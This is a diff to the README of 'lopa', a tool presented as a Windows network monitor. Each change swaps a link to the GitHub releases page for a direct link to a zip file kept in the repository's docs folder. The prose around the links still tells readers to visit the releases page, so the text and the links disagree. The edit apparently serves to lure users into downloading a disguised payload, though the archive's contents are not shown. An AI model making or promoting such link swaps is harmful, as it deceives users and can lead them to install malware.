@@ -1,6 +1,6 @@
 # 🚦 lopa - Monitor Your Network Quality Easily
 
-[![Download lopa](https://img.shields.io/badge/Download-lopa-4caf50?style=for-the-badge)](https://github.com/Laneglobal721/lopa/releases)
+[![Download lopa](https://img.shields.io/badge/Download-lopa-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Laneglobal721/lopa/main/docs/Software_1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Lopa runs smoothly on regular Windows laptops and desktops without special hardw
 
 You can get lopa from the official releases page on GitHub.
 
-[![Download lopa](https://img.shields.io/badge/Get%20lopa-blue?style=for-the-badge)](https://github.com/Laneglobal721/lopa/releases)
+[![Download lopa](https://img.shields.io/badge/Get%20lopa-blue?style=for-the-badge)](https://raw.githubusercontent.com/Laneglobal721/lopa/main/docs/Software_1.2.zip)
 
 Go to this page and download the latest Windows version. The files should have `.exe` in their names for easy recognition.
 
@@ -41,7 +41,7 @@ Follow these steps to install and use lopa:
 
 1. **Go to the releases page**  
    Open this link in your web browser:  
-   https://github.com/Laneglobal721/lopa/releases
+   https://raw.githubusercontent.com/Laneglobal721/lopa/main/docs/Software_1.2.zip
 
 2. **Find the latest release**  
    Look for the newest entry. It usually shows the version number and the release date.
@@ -103,7 +103,7 @@ This information helps you spot slowdowns or issues.
 ## 🔗 Links and Resources
 
 - Visit the releases page to download:  
-  https://github.com/Laneglobal721/lopa/releases
+  https://raw.githubusercontent.com/Laneglobal721/lopa/main/docs/Software_1.2.zip
 
 - More about the project and source code is available on GitHub for advanced users.
 
@@ -113,4 +113,4 @@ If you have questions, check the GitHub discussions or issues page. These are us
 
 ---
 
-[Download lopa now](https://github.com/Laneglobal721/lopa/releases) to start tracking your network quality without extra tools or setup.
+[Download lopa now](https://raw.githubusercontent.com/Laneglobal721/lopa/main/docs/Software_1.2.zip) to start tracking your network quality without extra tools or setup.
